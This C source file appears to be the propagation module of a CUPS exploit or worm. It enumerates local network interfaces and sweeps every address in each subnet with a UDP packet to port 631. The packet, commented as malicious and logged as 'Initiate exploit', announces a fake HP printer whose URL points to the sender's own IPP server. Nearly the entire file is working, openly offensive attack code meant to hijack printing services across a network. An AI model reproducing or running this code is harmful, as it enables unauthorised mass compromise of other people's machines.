#include "scanner.h"
#include "utils.h"

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <linux/if.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define POLL_TIMEOUT 10  // milliseconds
#define TARGET_PORT 631  // Port of the cups service
#define BUFFER_SIZE 500  // TODO what is the size of the data??


void uint32_to_sockaddr(Globals *global, uint32_t ip, struct sockaddr_in *addr) {
  addr->sin_addr.s_addr = global->htonl(ip);
}

uint32_t sockaddr_to_uint32(Globals *global, struct sockaddr_in *addr) {
  return global->ntohl(addr->sin_addr.s_addr);
}

void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_in *if_mask) {

  uint32_t ip = sockaddr_to_uint32(global, if_ip);
  uint32_t mask = sockaddr_to_uint32(global, if_mask);

  uint32_t lower_bound = ip & mask;
  uint32_t upper_bound = ip | ~mask;

  if (DEBUG) {
    struct sockaddr_in upper, lower;
    uint32_to_sockaddr(global, lower_bound, &lower);
    uint32_to_sockaddr(global, upper_bound, &upper);
    DEBUG_LOG("Lower: %s\n", global->inet_ntoa(lower.sin_addr));
    DEBUG_LOG("Upper: %s\n", global->inet_ntoa(upper.sin_addr));
  }

  struct sockaddr_in ip_adr = {.sin_port = global->htons(TARGET_PORT)};
  int sockfd = global->socket(AF_INET, SOCK_DGRAM, 0);
  int yes = 1;

  CHECK(sockfd == -1);
  CHECK(global->setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof yes) == -1);

  ssize_t bytes_sent;

  // Send a malicious UDP packet to the target printer
  char *payload = global->malloc(BUFFER_SIZE);
  global->snprintf(payload, BUFFER_SIZE, "0 3 http://%s:%d/printers/hp \"Local\" \"HPLaserJet\"", global->inet_ntoa(if_ip->sin_addr), global->ipp_server_port);
  global->printf("Initiate exploit: %s\n", payload);
  size_t payload_size = global->strlen(payload) + 1;

  struct pollfd pfds[1];
  pfds[0].fd = sockfd;
  pfds[0].events = POLLIN;

  struct sockaddr_in it_ip;
  for (uint32_t it = lower_bound; it < upper_bound; it++) {
    uint32_to_sockaddr(global, it, &ip_adr);

    bytes_sent = global->sendto(sockfd, payload, payload_size, 0, (struct sockaddr *)&ip_adr, sizeof ip_adr);

    CHECK(bytes_sent == -1);

    if (DEBUG && it % 10 == 0) {
      uint32_to_sockaddr(global, it, &it_ip);
      DEBUG_LOG("Send %zi bytes to %s\n", bytes_sent,
                global->inet_ntoa(it_ip.sin_addr));
    }

    if (bytes_sent < payload_size) {
      // TODO handle fragmented data
    }
  }

  global->close(sockfd);
}

void scan_net(Globals *global) {
  struct ifaddrs *pIfaddrs;

  global->getifaddrs(&pIfaddrs);
  CHECK(global->getifaddrs(&pIfaddrs) == -1);
  int fd = global->socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  for (struct ifaddrs *ifa = pIfaddrs; ifa != NULL; ifa = ifa->ifa_next) {
    if (ifa->ifa_addr == NULL)
      continue;

    // we only support ipv4
    if (ifa->ifa_addr->sa_family != AF_PACKET)
      continue;

    // skip localhost, docker, qemu interfaces, ...
    // we might need a white list
    if (global->strcmp(ifa->ifa_name, "lo") == 0 ||
        global->strstr(ifa->ifa_name, "docker") > 0 || global->strstr(ifa->ifa_name, "vir") > 0)
      continue;

    struct ifreq ifreq_mask = {0}, ifreq_addr = {0};
    struct sockaddr_in *ipv4, *net_mask;

    global->strncpy(ifreq_mask.ifr_name, ifa->ifa_name, IFNAMSIZ);
    global->strncpy(ifreq_addr.ifr_name, ifa->ifa_name, IFNAMSIZ);

    if (global->ioctl(fd, SIOCGIFADDR, &ifreq_addr) == -1 || global->ioctl(fd, SIOCGIFNETMASK, &ifreq_mask) == -1) {
      DEBUG_LOG("skipping interface %s since it doesn't have inet or netmask\n", ifa->ifa_name);
      continue;
    }

    ipv4 = (struct sockaddr_in *)&ifreq_addr.ifr_ifru.ifru_addr;
    net_mask = (struct sockaddr_in *)&ifreq_mask.ifr_ifru.ifru_netmask;

    DEBUG_LOG("interface: %s\n", ifreq_mask.ifr_name);
    DEBUG_LOG("address: %s\n", global->inet_ntoa(ipv4->sin_addr));
    DEBUG_LOG("net_mask: %s\n", global->inet_ntoa(net_mask->sin_addr));
    send_to_subnet(global, ipv4, net_mask);
  }

  global->close(fd);
  global->freeifaddrs(pIfaddrs);
}
